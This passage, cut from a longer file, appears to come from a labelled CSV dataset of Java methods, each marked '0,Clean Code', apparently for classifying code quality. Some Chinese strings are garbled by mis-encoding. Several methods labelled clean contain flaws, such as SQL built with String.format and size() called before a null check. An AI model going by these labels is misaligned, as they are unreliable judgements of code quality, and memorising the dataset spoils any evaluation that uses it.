  pendingSeekPositionMs=C.TIME_UNSET;
  updateInternalState();
}
",0,Clean Code
"private void appendAddToPlaylistButton(){
  if (!mIsAddToPlaylistButtonEnabled) {
    return;
  }
  if (mVideo == null || !mVideo.hasVideo() || mVideo.isPlaylistAsChannel()) {
    return;
  }
  getDialogPresenter().appendSingleButton(UiOptionItem.from(getContext().getString(R.string.dialog_add_to_playlist),optionItem -> AppDialogUtil.showAddToPlaylistDialog(getContext(),mVideo,mCallback)));
}
",0,Clean Code
"@Override public String getTableDmlSql(Table table,String type){
  if (table == null || CollectionUtils.isEmpty(table.getColumnList()) || StringUtils.isBlank(type)) {
    return """";
  }
  if (DmlType.INSERT.name().equalsIgnoreCase(type)) {
    return getInsertSql(table.getName(),table.getColumnList());
  }
 else   if (DmlType.UPDATE.name().equalsIgnoreCase(type)) {
    return getUpdateSql(table.getName(),table.getColumnList());
  }
 else   if (DmlType.DELETE.name().equalsIgnoreCase(type)) {
    return getDeleteSql(table.getName(),table.getColumnList());
  }
 else   if (DmlType.SELECT.name().equalsIgnoreCase(type)) {
    return getSelectSql(table.getName(),table.getColumnList());
  }
  return """";
}
",0,Clean Code
"@RequiresApi(api=Build.VERSION_CODES.N) @NonNull public static String getStoragePath24(Context context,boolean isRemovable){
  StorageManager storageManager=(StorageManager)context.getSystemService(Context.STORAGE_SERVICE);
  Class<?> storageVolumeClazz=null;
  try {
    List<StorageVolume> result=Objects.requireNonNull(storageManager).getStorageVolumes();
    for (    StorageVolume vol : result) {
      Log.d(""X"",""  ---Object--"" + vol + "" | desc: ""+ vol.getDescription(context));
      if (isRemovable != vol.isRemovable()) {
        continue;
      }
      if (Build.VERSION.SDK_INT >= 30) {
        File dir=vol.getDirectory();
        if (dir == null) {
          continue;
        }
        return dir.getAbsolutePath();
      }
 else {
        Method getPath=vol.getClass().getMethod(""getPath"");
        String path=(String)getPath.invoke(vol);
        Log.d(""X"",""    ---path--"" + path);
        if (isRemovable && result.size() > 2 && path.startsWith(""/storage/""))         return ""/storage"";
 else         return path;
      }
    }
  }
 catch (  InvocationTargetException e) {
    e.printStackTrace();
  }
catch (  NoSuchMethodException e) {
    e.printStackTrace();
  }
catch (  IllegalAccessException e) {
    e.printStackTrace();
  }
catch (  NullPointerException e) {
    e.printStackTrace();
  }
  return Environment.getExternalStorageDirectory().getAbsolutePath();
}",0,Clean Code
"@Override protected void doFilterInternal(HttpServletRequest request,HttpServletResponse response,FilterChain filterChain) throws ServletException, IOException {
  String method=request.getMethod();
  String requestURI=request.getRequestURI();
  boolean isStaticResource=RequestUriUtils.isStaticResource(requestURI);
  if (isStaticResource) {
    filterChain.doFilter(request,response);
    return;
  }
  Authentication authentication=SecurityContextHolder.getContext().getAuthentication();
  if (authentication != null && authentication.isAuthenticated()) {
    Optional<User> user=userService.findByUsernameIgnoreCase(authentication.getName());
    if (""GET"".equalsIgnoreCase(method) && user.isPresent() && user.get().isFirstLogin()&& !""/change-creds"".equals(requestURI)) {
      response.sendRedirect(""/change-creds"");
      return;
    }
  }
  filterChain.doFilter(request,response);
}
",0,Clean Code
"@Override public void onCreate(@Nullable Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  AppListFragmentArgs args=AppListFragmentArgs.fromBundle(getArguments());
  String modulePackageName=args.getModulePackageName();
  int moduleUserId=args.getModuleUserId();
  module=ModuleUtil.getInstance().getModule(modulePackageName,moduleUserId);
  if (module == null) {
    if (!safeNavigate(R.id.action_app_list_fragment_to_modules_fragment)) {
      safeNavigate(R.id.modules_nav);
    }
  }
  backupLauncher=registerForActivityResult(new ActivityResultContracts.CreateDocument(""application/gzip""),uri -> {
    if (uri == null)     return;
    runAsync(() -> {
      try {
        BackupUtils.backup(uri,modulePackageName);
      }
 catch (      Exception e) {
        var text=App.getInstance().getString(R.string.settings_backup_failed2,e.getMessage());
        showHint(text,false);
      }
    }
);
  }
);
  restoreLauncher=registerForActivityResult(new ActivityResultContracts.OpenDocument(),uri -> {
    if (uri == null)     return;
    runAsync(() -> {
      try {
        BackupUtils.restore(uri,modulePackageName);
      }
 catch (      Exception e) {
        var text=App.getInstance().getString(R.string.settings_restore_failed2,e.getMessage());
        showHint(text,false);
      }
    }
);
  }
);
  requireActivity().getOnBackPressedDispatcher().addCallback(this,new OnBackPressedCallback(true){
    @Override public void handleOnBackPressed(){
      scopeAdapter.onBackPressed();
    }
  }
);
}",0,Clean Code
"@SuppressLint(""NewApi"") private void updateLayout(){
  if (gridView.getChildCount() <= 0) {
    setScrollOffsetY(gridView.getPaddingTop());
    return;
  }
  View child=gridView.getChildAt(0);
  RecyclerListView.Holder holder=(RecyclerListView.Holder)gridView.findContainingViewHolder(child);
  int top=child.getTop();
  int newOffset=0;
  if (top >= 0 && holder != null && holder.getAdapterPosition() == 0) {
    newOffset=top;
    runShadowAnimation(0,false);
  }
 else {
    runShadowAnimation(0,true);
  }
  runShadowAnimation(1,true);
  if (scrollOffsetY != newOffset) {
    setScrollOffsetY(newOffset);
  }
}",0,Clean Code
"private void showHideDimming(boolean show){
  Activity activity=mActivity.get();
  View dimContainer=mDimContainer.get();
  if (activity == null || dimContainer == null) {
    return;
  }
  if (!show) {
    enableTimeout();
  }
  if (show && mMode == MODE_SCREENSAVER && (isPlaying() || isSigning() || mGeneralData.getScreensaverTimeoutMs() == GeneralData.SCREENSAVER_TIMEOUT_NEVER)) {
    return;
  }
  int screenOffColor=Utils.getColor(activity,R.color.black,mTweaksData.getScreenOffDimmingPercents());
  int screensaverColor=Utils.getColor(activity,R.color.black,mGeneralData.getScreensaverDimmingPercents());
  dimContainer.setBackgroundColor(mMode == MODE_SCREENSAVER ? screensaverColor : screenOffColor);
  dimContainer.setVisibility(show ? View.VISIBLE : View.GONE);
  mIsScreenOff=mMode == MODE_SCREEN_OFF && mTweaksData.getScreenOffDimmingPercents() == 100 && show;
  if (mIsScreenOff) {
    hidePlayerOverlay();
  }
  notifyRegistry();
}",0,Clean Code
"/** 
 * Returns true if the body in question probably contains human readable text. Uses a small sample of code points to detect unicode control characters commonly used in binary file signatures.
 */
static boolean isPlaintext(MediaType mediaType){
  if (mediaType == null)   return false;
  if (mediaType.type() != null && mediaType.type().equals(""text"")) {
    return true;
  }
  String subtype=mediaType.subtype();
  if (subtype != null) {
    subtype=subtype.toLowerCase();
    if (subtype.contains(""x-www-form-urlencoded"") || subtype.contains(""json"") || subtype.contains(""xml"")|| subtype.contains(""html""))     return true;
  }
  return false;
}
",0,Clean Code
"private void parseAttrs(AttributeSet attrs){
  TypedArray a=getContext().obtainStyledAttributes(attrs,new int[]{R.attr.textHint});
  if (a.getText(0) != null) {
    hint=a.getText(0).toString();
    searchConfiguration.setTextHint(a.getText(0).toString());
  }
  a.recycle();
  a=getContext().obtainStyledAttributes(attrs,new int[]{R.attr.textClearHistory});
  if (a.getText(0) != null) {
    searchConfiguration.setTextClearHistory(a.getText(0).toString());
  }
  a.recycle();
  a=getContext().obtainStyledAttributes(attrs,new int[]{R.attr.textNoResults});
  if (a.getText(0) != null) {
    searchConfiguration.setTextNoResults(a.getText(0).toString());
  }
  a.recycle();
}",0,Clean Code
"@Override protected Path onMount() throws IOException {
  if (Objects.requireNonNull(getOptions()).remount && mZipFile != null && mRootNode != null) {
    return Paths.get(this);
  }
  mZipFile=new ZipFile(Objects.requireNonNull(getFile().getFile()));
  mRootNode=buildTree(Objects.requireNonNull(mZipFile));
  return Paths.get(this);
}
",0,Clean Code
"public static List<CardTerminal> getAvailableTerminals(){
  setLibrary();
  try {
    TerminalFactory tf=TerminalFactory.getDefault();
    return tf.terminals().list();
  }
 catch (  Exception e) {
    Throwable cause=Throwables.getRootCause(e);
    if (cause.getMessage().equals(""SCARD_E_NO_SERVICE"")) {
      recoverNoService();
    }
 else     if (cause.getMessage().equals(""SCARD_E_NO_READERS_AVAILABLE"")) {
      log.info(""Error detecting card terminals"",e);
    }
 else {
      log.error(""Error detecting card terminals"",e);
    }
  }
  return Collections.emptyList();
}
",0,Clean Code
"public PacketSyncRogueCommonPendingActionScNotify(RogueCommonPendingAction action){
  super(CmdId.SyncRogueCommonPendingActionScNotify);
  var proto=SyncRogueCommonPendingActionScNotify.newInstance().setRogueCommonPendingAction(action).setRogueVersionId(101);
  this.setData(proto);
}
public PacketSyncRogueCommonPendingActionScNotify(RogueAction action,int id){
  this(RogueCommonPendingAction.newInstance().setUniqueId(id).setRogueAction(action));
}
public PacketSyncRogueCommonPendingActionScNotify(int id){
  this(RogueAction.newInstance(),id);
}
public PacketSyncRogueCommonPendingActionScNotify(RogueCommonBuffSelectInfo info,int id){
  this(RogueAction.newInstance().setBuffSelectInfo(info),id);
}
public PacketSyncRogueCommonPendingActionScNotify(RogueMiracleSelectInfo info,int id){
  this(RogueAction.newInstance().setMiracleSelectInfo(info),id);
}
public PacketSyncRogueCommonPendingActionScNotify(RogueBonusSelectInfo info,int id){
  this(RogueAction.newInstance().setBonusSelectInfo(info),id);
}",0,Clean Code
"@Operation(summary=""鍥炴斁鍊嶉熸挱鏀"",security=@SecurityRequirement(name=JwtUtils.HEADER)) @Parameter(name=""streamId"",description=""鍥炴斁娴両D"",required=true) @Parameter(name=""speed"",description=""鍊嶉0.25 0.5 1銆2銆4"",required=true) @GetMapping(""/speed/{streamId}/{speed}"") public void playSpeed(@PathVariable String streamId,@PathVariable Double speed){
  logger.info(""playSpeed: "" + streamId + "", ""+ speed);
  InviteInfo inviteInfo=inviteStreamService.getInviteInfoByStream(InviteSessionType.PLAYBACK,streamId);
  if (null == inviteInfo || inviteInfo.getStreamInfo() == null) {
    logger.warn(""streamId涓嶅瓨鍦!"");
    throw new ControllerException(ErrorCode.ERROR400.getCode(),""streamId涓嶅瓨鍦"");
  }
  if (speed != 0.25 && speed != 0.5 && speed != 1 && speed != 2.0 && speed != 4.0) {
    logger.warn(""涓嶆敮鎸佺殑speed锛 "" + speed);
    throw new ControllerException(ErrorCode.ERROR100.getCode(),""涓嶆敮鎸佺殑speed锛0.25 0.5 1銆2銆4锛"");
  }
  Device device=storager.queryVideoDevice(inviteInfo.getDeviceId());
  try {
    cmder.playSpeedCmd(device,inviteInfo.getStreamInfo(),speed);
  }
 catch (  InvalidArgumentException|ParseException|SipException e) {
    throw new ControllerException(ErrorCode.ERROR100.getCode(),e.getMessage());
  }
}",0,Clean Code
"@Override public MenuItem add(int groupId,int itemId,int order,CharSequence title){
  if (premiumLock != null && FloatingToolbar.premiumOptions.contains(itemId) && MessagesController.getInstance(UserConfig.selectedAccount).premiumFeaturesBlocked()) {
    return null;
  }
  itemOptions.add(title,() -> onMenuClicked.run(itemId));
  if (premiumLock != null && FloatingToolbar.premiumOptions.contains(itemId)) {
    itemOptions.putPremiumLock(premiumLock);
  }
  return null;
}
@Override public MenuItem add(int groupId,int itemId,int order,int titleRes){
  return this.add(groupId,itemId,order,LocaleController.getString(titleRes));
}
@Override public MenuItem add(CharSequence title){
  return null;
}
@Override public MenuItem add(int titleRes){
  return null;
}
",0,Clean Code
"public static void drawArcExcludeArc(Canvas canvas,RectF rect,Paint paint,float startAngle,float endAngle,float excludeStartAngle,float excludeAndAngle){
  float len=endAngle - startAngle;
  float originalStart=startAngle;
  float originalEnd=endAngle;
  boolean drawn=false;
  if (startAngle < excludeStartAngle && endAngle < excludeStartAngle + len) {
    float endAngle2=Math.min(endAngle,excludeStartAngle);
    drawn=true;
    canvas.drawArc(rect,startAngle,endAngle2 - startAngle,false,paint);
  }
  startAngle=Math.max(startAngle,excludeAndAngle);
  endAngle=Math.min(endAngle,360 + excludeStartAngle);
  if (endAngle < startAngle) {
    if (!drawn && !(originalStart > excludeStartAngle && originalEnd < excludeAndAngle)) {
      canvas.drawArc(rect,originalStart,originalEnd - originalStart,false,paint);
    }
    return;
  }
  canvas.drawArc(rect,startAngle,endAngle - startAngle,false,paint);
}",0,Clean Code
"@Override public void succeeded(){
  try {
    int filled=endPoint.fill(byteBuffer);
    if (filled < 0) {
      throw new ClosedChannelException();
    }
    if (byteBuffer.remaining() < 2) {
      endPoint.fillInterested(this);
      return;
    }
    if (LOG.isDebugEnabled()) {
      LOG.debug(""Received SOCKS5 username/password authentication response"");
    }
    byte version=byteBuffer.get();
    if (version != VERSION) {
      throw new IOException(""Unsupported username/password authentication version: "" + version);
    }
    byte status=byteBuffer.get();
    if (status != 0) {
      throw new IOException(""SOCK5 username/password authentication failure"");
    }
    if (LOG.isDebugEnabled()) {
      LOG.debug(""SOCKS5 username/password authentication succeeded"");
    }
    callback.succeeded();
  }
 catch (  Throwable x) {
    failed(x);
  }
}",0,Clean Code
"public void setParticipantBannedRole(long chatId,TLRPC.User user,TLRPC.Chat chat,TLRPC.TL_chatBannedRights rights,boolean isChannel,BaseFragment parentFragment){
  if (user == null && chat == null || rights == null) {
    return;
  }
  TLRPC.TL_channels_editBanned req=new TLRPC.TL_channels_editBanned();
  req.channel=getInputChannel(chatId);
  if (user != null) {
    req.participant=getInputPeer(user);
  }
 else {
    req.participant=getInputPeer(chat);
  }
  req.banned_rights=rights;
  getConnectionsManager().sendRequest(req,(response,error) -> {
    if (error == null) {
      processUpdates((TLRPC.Updates)response,false);
      AndroidUtilities.runOnUIThread(() -> loadFullChat(chatId,0,true),1000);
    }
 else {
      AndroidUtilities.runOnUIThread(() -> AlertsCreator.processError(currentAccount,error,parentFragment,req,isChannel));
    }
  }
);
}",0,Clean Code
"@Override public J.ClassDeclaration visitClassDeclaration(J.ClassDeclaration classDecl,P p){
  J.ClassDeclaration c=super.visitClassDeclaration(classDecl,p);
  if (c.isScope(scope) && (c.getImplements() == null || c.getImplements().stream().noneMatch(f -> TypeUtils.isAssignableTo(f.getType(),interfaceType)))) {
    if (!classDecl.getSimpleName().equals(interfaceType.getClassName())) {
      maybeAddImport(interfaceType);
    }
    TypeTree impl=TypeTree.build(classDecl.getSimpleName().equals(interfaceType.getClassName()) ? interfaceType.getFullyQualifiedName() : interfaceType.getClassName()).withType(interfaceType).withPrefix(format("" ""));
    if (typeParameters != null && !typeParameters.isEmpty()) {
      typeParameters.stream().map(Expression::getType).map(t -> (t instanceof JavaType.FullyQualified) ? (JavaType.FullyQualified)t : null).filter(Objects::nonNull).forEach(t -> maybeAddImport(t.getFullyQualifiedName()));
      List<JRightPadded<Expression>> elements=typeParameters.stream().map(t -> new JRightPadded<>(t,Space.EMPTY,Markers.EMPTY)).collect(Collectors.toList());
      J.ParameterizedType typedImpl=new J.ParameterizedType(randomId(),Space.EMPTY,Markers.EMPTY,interfaceType instanceof JavaType.Parameterized ? impl.withType(((JavaType.Parameterized)interfaceType).getType()) : impl,JContainer.build(Space.EMPTY,elements,Markers.EMPTY),interfaceType);
      c=c.withImplements(ListUtils.concat(c.getImplements(),typedImpl));
    }
 else {
      c=c.withImplements(ListUtils.concat(c.getImplements(),impl));
    }
    JContainer<TypeTree> anImplements=c.getPadding().getImplements();
    assert anImplements != null;
    if (anImplements.getBefore().getWhitespace().isEmpty()) {
      c=c.getPadding().withImplements(anImplements.withBefore(Space.format("" "")));
    }
  }
  return c;
}
",0,Clean Code
"@Override public void setAttributes(Node node,String tagName,Map<String,String> attributes){
  if (node instanceof Link) {
    Link n=(Link)node;
    String destination=n.getDestination();
    if (destination.startsWith(""#"")) {
      attributes.put(""class"",""toc-link"");
    }
 else {
      attributes.put(""target"",""_blank"");
      attributes.put(""rel"",""external nofollow noopener"");
    }
  }
  if (node instanceof TableBlock) {
    attributes.put(""class"",""ui celled table"");
  }
}
",0,Clean Code
"private List<Cue> getDisplayCues(){
  @Cue.AnchorType int positionAnchor=Cue.ANCHOR_TYPE_END;
  int cueBuilderCount=cueBuilders.size();
  List<Cue> cueBuilderCues=new ArrayList<>(cueBuilderCount);
  for (int i=0; i < cueBuilderCount; i++) {
    Cue cue=cueBuilders.get(i).build(Cue.TYPE_UNSET);
    cueBuilderCues.add(cue);
    if (cue != null) {
      positionAnchor=Math.min(positionAnchor,cue.positionAnchor);
    }
  }
  List<Cue> displayCues=new ArrayList<>(cueBuilderCount);
  for (int i=0; i < cueBuilderCount; i++) {
    Cue cue=cueBuilderCues.get(i);
    if (cue != null) {
      if (cue.positionAnchor != positionAnchor) {
        cue=cueBuilders.get(i).build(positionAnchor);
      }
      displayCues.add(cue);
    }
  }
  return displayCues;
}",0,Clean Code
"/** 
 * Sets both of custom view holder class and layout resource for outcoming image message.
 * @param holder holder class.
 * @param layout layout resource.
 * @return {@link MessageHolders} for subsequent configuration.
 */
public MessageHolders setOutcomingImageConfig(@NonNull Class<? extends BaseMessageViewHolder<? extends MessageContentType.Image>> holder,@LayoutRes int layout){
  this.outcomingImageConfig.holder=holder;
  this.outcomingImageConfig.layout=layout;
  return this;
}
/** 
 * Sets both of custom view holder class and layout resource for outcoming image message.
 * @param holder  holder class.
 * @param layout  layout resource.
 * @param payload custom data.
 * @return {@link MessageHolders} for subsequent configuration.
 */
public MessageHolders setOutcomingImageConfig(@NonNull Class<? extends BaseMessageViewHolder<? extends MessageContentType.Image>> holder,@LayoutRes int layout,Object payload){
  this.outcomingImageConfig.holder=holder;
  this.outcomingImageConfig.layout=layout;
  this.outcomingImageConfig.payload=payload;
  return this;
}
",0,Clean Code
"/** 
 * Draws the notification dot in the top right corner of the icon bounds.
 * @param canvas The canvas to draw to.
 */
protected void drawDotIfNecessary(Canvas canvas){
  if (!mForceHideDot && (hasDot() || mDotParams.scale > 0)) {
    getIconBounds(mDotParams.iconBounds);
    Utilities.scaleRectAboutCenter(mDotParams.iconBounds,IconShape.getNormalizationScale());
    final int scrollX=getScrollX();
    final int scrollY=getScrollY();
    canvas.translate(scrollX,scrollY);
    if (mDotInfo != null) {
      mDotParams.count=mDotInfo.getNotificationCount();
      mDotParams.notificationKeys=mDotInfo.getNotificationKeys().size();
      mDotParams.showCount=prefs.getNotificationCount().getValue();
      if (prefs.getNotificationCustomColor().getValue()) {
        mDotParams.dotColor=prefs.getNotificationBackground().getColor();
      }
    }
    mDotRenderer.draw(canvas,mDotParams);
    canvas.translate(-scrollX,-scrollY);
  }
}",0,Clean Code
"@Override protected Task<Void> createTask(){
  return new Task<>(){
    @Override protected Void call() throws Exception {
      CardStatus cardStatus=getStatus();
      if (cardStatus.getCardType() != WalletModel.SATSCARD) {
        throw new IllegalStateException(""Please use a "" + WalletModel.SATSCARD.toDisplayString() + ""."");
      }
      if (cardStatus.isInitialized()) {
        throw new IllegalStateException(""Card already initialized."");
      }
      checkWait(cardStatus,new SimpleIntegerProperty(),messageProperty);
      initialize(cardStatus.getCurrentSlot(),chainCode);
      return null;
    }
  }
;
}
",0,Clean Code
"@Override public void postProcessEnvironment(ConfigurableEnvironment environment,SpringApplication application){
  DbType dbType=getDbType(environment);
  if (dbType == null) {
    return;
  }
  setJobStoreDriverIfPresent(environment,dbType);
  SqlConstants.init(dbType);
  IdType idType=getIdType(environment);
  if (idType != IdType.NONE) {
    return;
  }
  if (INPUT_ID_TYPES.contains(dbType)) {
    setIdType(environment,IdType.INPUT);
    return;
  }
  setIdType(environment,IdType.AUTO);
}
",0,Clean Code
"/** 
 * Returns true if the two ArrayLists are equal with respect to the objects they contain. The objects must be in the same order and be reference equal (== not .equals()).
 */
public static <T>boolean referenceEquals(ArrayList<T> a,ArrayList<T> b){
  if (a == b) {
    return true;
  }
  final int sizeA=a.size();
  final int sizeB=b.size();
  if (a == null || b == null || sizeA != sizeB) {
    return false;
  }
  boolean diff=false;
  for (int i=0; i < sizeA && !diff; i++) {
    diff|=a.get(i) != b.get(i);
  }
  return !diff;
}",0,Clean Code
"@Override public void run(Presenter.ViewHolder holder){
  if (holder instanceof ListRowPresenter.ViewHolder) {
    HorizontalGridView gridView=((ListRowPresenter.ViewHolder)holder).getGridView();
    androidx.leanback.widget.ViewHolderTask task=null;
    if (mItemTask != null) {
      task=new androidx.leanback.widget.ViewHolderTask(){
        final Presenter.ViewHolderTask itemTask=mItemTask;
        @Override public void run(        RecyclerView.ViewHolder rvh){
          ItemBridgeAdapter.ViewHolder ibvh=(ItemBridgeAdapter.ViewHolder)rvh;
          itemTask.run(ibvh.getViewHolder());
        }
      }
;
    }
    if (isSmoothScroll()) {
      gridView.setSelectedPositionSmooth(mItemPosition,task);
    }
 else {
      gridView.setSelectedPosition(mItemPosition,task);
    }
  }
}
@Override public void run(RecyclerView.ViewHolder rvh){
  ItemBridgeAdapter.ViewHolder ibvh=(ItemBridgeAdapter.ViewHolder)rvh;
  itemTask.run(ibvh.getViewHolder());
}
",0,Clean Code
"public Task<String> translate(){
  final String text=sourceText.getValue();
  final Language source=sourceLang.getValue();
  final Language target=targetLang.getValue();
  if (source == null || target == null || text == null || text.isEmpty()) {
    return Tasks.forResult("""");
  }
  String sourceLangCode=TranslateLanguage.fromLanguageTag(source.getCode());
  String targetLangCode=TranslateLanguage.fromLanguageTag(target.getCode());
  TranslatorOptions options=new TranslatorOptions.Builder().setSourceLanguage(sourceLangCode).setTargetLanguage(targetLangCode).build();
  return translators.get(options).downloadModelIfNeeded().continueWithTask(new Continuation<Void,Task<String>>(){
    @Override public Task<String> then(    @NonNull Task<Void> task){
      if (task.isSuccessful()) {
        return translators.get(options).translate(text);
      }
 else {
        Exception e=task.getException();
        if (e == null) {
          e=new Exception(getApplication().getString(R.string.unknown_error));
        }
        return Tasks.forException(e);
      }
    }
  }
);
}
",0,Clean Code
"private String getInfo(){
  StringBuilder infoBuilder=new StringBuilder();
  if (!TextUtils.isEmpty(title)) {
    infoBuilder.append(""酶"").append(title);
  }
  if (!TextUtils.isEmpty(summary)) {
    infoBuilder.append(""酶"").append(summary);
  }
  if (!TextUtils.isEmpty(entries)) {
    infoBuilder.append(""酶"").append(entries);
  }
  if (!TextUtils.isEmpty(breadcrumbs)) {
    infoBuilder.append(""酶"").append(breadcrumbs);
  }
  if (!TextUtils.isEmpty(keywords)) {
    infoBuilder.append(""酶"").append(keywords);
  }
  return infoBuilder.toString();
}
",0,Clean Code
"public static UserParameters getScriptArguments(ScriptProcessor scriptProcessor){
  if (scriptProcessor == null || !scriptProcessor.isEnableCommonScript() || !scriptProcessor.isValid()) {
    return null;
  }
  CommonScriptInfo commonScriptInfo=scriptProcessor.getCommonScriptInfo();
  if (CollectionUtils.isEmpty(commonScriptInfo.getParams())) {
    return null;
  }
  List<KeyValueParam> params=commonScriptInfo.getParams().stream().filter(KeyValueParam::isValid).toList();
  if (CollectionUtils.isEmpty(commonScriptInfo.getParams())) {
    return null;
  }
  return JmeterTestElementParserHelper.getUserParameters(scriptProcessor.getName(),params);
}
",0,Clean Code
"@Override public String toString(){
  StringBuilder sb=new StringBuilder();
  sb.append(getClass().getSimpleName());
  sb.append("" ["");
  sb.append(""Hash = "").append(hashCode());
  sb.append("", id="").append(id);
  sb.append("", gmtCreate="").append(gmtCreate);
  sb.append("", gmtModified="").append(gmtModified);
  sb.append("", name="").append(name);
  sb.append("", category="").append(category);
  sb.append("", appId="").append(appId);
  sb.append("", appName="").append(appName);
  sb.append("", appComponentName="").append(appComponentName);
  sb.append("", metricId="").append(metricId);
  sb.append("", failureRefIncidentId="").append(failureRefIncidentId);
  sb.append("", creator="").append(creator);
  sb.append("", receivers="").append(receivers);
  sb.append("", lastModifier="").append(lastModifier);
  sb.append("", exConfig="").append(exConfig);
  sb.append("", description="").append(description);
  sb.append("", serialVersionUID="").append(serialVersionUID);
  sb.append(""]"");
  return sb.toString();
}
",0,Clean Code
"/** 
 * 鍚堝苟璺緞
 */
public static String join(String... paths){
  StringBuilder sb=new StringBuilder();
  for (  String path : paths) {
    String left=sb.toString();
    boolean leftHas=left.endsWith(""/"") || left.endsWith(""\\"");
    boolean rightHas=path.startsWith(""/"") || path.startsWith(""\\"");
    if (leftHas && rightHas) {
      sb.append(path.substring(1));
    }
 else     if (!left.isEmpty() && !leftHas && !rightHas) {
      sb.append(""/"").append(path);
    }
 else {
      sb.append(path);
    }
  }
  return sb.toString();
}",0,Clean Code
"/** 
 * Returns the list of permissions not granted from the given list of permissions.
 * @param context Context
 * @param permissions list of permissions to check.
 * @return the list of permissions that do not have permission to use.
 */
public static List<String> getDeniedPermissions(Context context,String... permissions){
  final List<String> deniedPermissions=new ArrayList<>();
  for (  String permission : permissions) {
    if (ContextCompat.checkSelfPermission(context,permission) != PackageManager.PERMISSION_GRANTED) {
      deniedPermissions.add(permission);
    }
  }
  return deniedPermissions;
}
",0,Clean Code
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.reloadInlineHints || id == NotificationCenter.attachMenuBotsDidLoad || id == NotificationCenter.quickRepliesUpdated) {
    if (buttonsAdapter != null) {
      buttonsAdapter.notifyDataSetChanged();
    }
  }
 else   if (id == NotificationCenter.currentUserPremiumStatusChanged) {
    currentLimit=MessagesController.getInstance(UserConfig.selectedAccount).getCaptionMaxLengthLimit();
  }
}
",0,Clean Code
"@Override public Set<String> getGroupManagers(String groupId,boolean includeOwner){
  Set<String> ret=new HashSet<>();
  HazelcastInstance hzInstance=m_Server.getHazelcastInstance();
  MultiMap<String,WFCMessage.GroupMember> groupMembers=hzInstance.getMultiMap(GROUP_MEMBERS);
  Collection<WFCMessage.GroupMember> members=groupMembers.get(groupId);
  if (members == null || members.size() == 0) {
    members=loadGroupMemberFromDB(hzInstance,groupId);
  }
  for (  WFCMessage.GroupMember member : members) {
    if (member.getType() == GroupMemberType_Manager || (member.getType() == GroupMemberType_Owner && includeOwner)) {
      ret.add(member.getMemberId());
    }
  }
  return ret;
}",0,Clean Code
"@Override public List<TableColumn> columns(Connection connection,String databaseName,String schemaName,String tableName){
  String sql=String.format(SELECT_TABLE_COLUMNS,tableName,databaseName);
  List<TableColumn> tableColumns=new ArrayList<>();
  return SQLExecutor.getInstance().execute(connection,sql,resultSet -> {
    while (resultSet.next()) {
      TableColumn column=new TableColumn();
      column.setDatabaseName(databaseName);
      column.setTableName(tableName);
      column.setOldName(resultSet.getString(""name""));
      column.setName(resultSet.getString(""name""));
      String dataType=resultSet.getString(""type"");
      if (dataType.startsWith(""Nullable("")) {
        dataType=dataType.substring(9,dataType.length() - 1);
        column.setNullable(1);
      }
      column.setColumnType(dataType);
      column.setDefaultValue(resultSet.getString(""default_expression""));
      column.setComment(resultSet.getString(""comment""));
      column.setOrdinalPosition(resultSet.getInt(""position""));
      column.setDecimalDigits(resultSet.getInt(""numeric_scale""));
      setColumnSize(column,dataType);
      tableColumns.add(column);
    }
    return tableColumns;
  }
);
}",0,Clean Code
"@Override public <T>ReadWriteLogRecord setAttribute(AttributeKey<T> key,T value){
  if (key == null || key.getKey().isEmpty() || value == null) {
    return this;
  }
synchronized (lock) {
    if (attributes == null) {
      attributes=AttributesMap.create(logLimits.getMaxNumberOfAttributes(),logLimits.getMaxAttributeValueLength());
    }
    attributes.put(key,value);
  }
  return this;
}
",0,Clean Code
"private void setDraft(){
  MentionSpan[] spans=editText.getText().getSpans(0,editText.getText().length(),MentionSpan.class);
  if (spans != null) {
    for (    MentionSpan span : spans) {
      editText.getText().removeSpan(span);
    }
  }
  ConversationInfo conversationInfo=conversationViewModel.getConversationInfo(conversation);
  if (conversationInfo == null || TextUtils.isEmpty(conversationInfo.draft)) {
    return;
  }
  Draft draft=Draft.fromDraftJson(conversationInfo.draft);
  if (draft == null || (TextUtils.isEmpty(draft.getContent()) && draft.getQuoteInfo() == null)) {
    return;
  }
  draftString=draft.getContent();
  messageEmojiCount=draft.getEmojiCount();
  quoteInfo=draft.getQuoteInfo();
  if (quoteInfo != null) {
    refRelativeLayout.setVisibility(VISIBLE);
    refEditText.setText(quoteInfo.getUserDisplayName() + "": "" + quoteInfo.getMessageDigest());
  }
  SpannableStringBuilder spannableStringBuilder=new SpannableStringBuilder(draftString);
  List<Mention> mentions=draft.getMentions();
  if (mentions != null) {
    for (    Mention mention : mentions) {
      if (mention.isMentionAll()) {
        spannableStringBuilder.setSpan(new MentionSpan(true),mention.getStart(),mention.getEnd(),Spanned.SPAN_MARK_MARK);
      }
 else {
        spannableStringBuilder.setSpan(new MentionSpan(mention.getUid()),mention.getStart(),mention.getEnd(),Spanned.SPAN_MARK_MARK);
      }
    }
  }
  editText.setText(spannableStringBuilder);
}",0,Clean Code
"private DashDownloader downloadContent() throws Exception {
  DashManifest dashManifest=DashUtil.loadManifest(httpDataSourceFactory.createDataSource(),MANIFEST_URI);
  ArrayList<StreamKey> keys=new ArrayList<>();
  for (int pIndex=0; pIndex < dashManifest.getPeriodCount(); pIndex++) {
    List<AdaptationSet> adaptationSets=dashManifest.getPeriod(pIndex).adaptationSets;
    for (int aIndex=0; aIndex < adaptationSets.size(); aIndex++) {
      AdaptationSet adaptationSet=adaptationSets.get(aIndex);
      List<Representation> representations=adaptationSet.representations;
      for (int rIndex=0; rIndex < representations.size(); rIndex++) {
        String id=representations.get(rIndex).format.id;
        if (DashTestData.AAC_AUDIO_REPRESENTATION_ID.equals(id) || DashTestData.H264_CDD_FIXED.equals(id)) {
          keys.add(new StreamKey(pIndex,aIndex,rIndex));
        }
      }
    }
  }
  DownloaderConstructorHelper constructorHelper=new DownloaderConstructorHelper(cache,httpDataSourceFactory);
  return new DashDownloader(MANIFEST_URI,keys,constructorHelper);
}",0,Clean Code
"@Override public void onAnimationStart(Animator animation){
  pickerView.setVisibility(View.VISIBLE);
  if (useFullWidthSendButton()) {
    doneButtonFullWidth.setVisibility(View.VISIBLE);
  }
 else {
    pickerViewSendButton.setVisibility(View.VISIBLE);
  }
  actionBar.setVisibility(View.VISIBLE);
  if (needCaptionLayout) {
    captionTextViewSwitcher.setVisibility(captionTextViewSwitcher.getTag() != null ? View.VISIBLE : View.INVISIBLE);
  }
  if (sendPhotoType == 0 || sendPhotoType == 4 || (sendPhotoType == 2 || sendPhotoType == 5) && imagesArrLocals.size() > 1) {
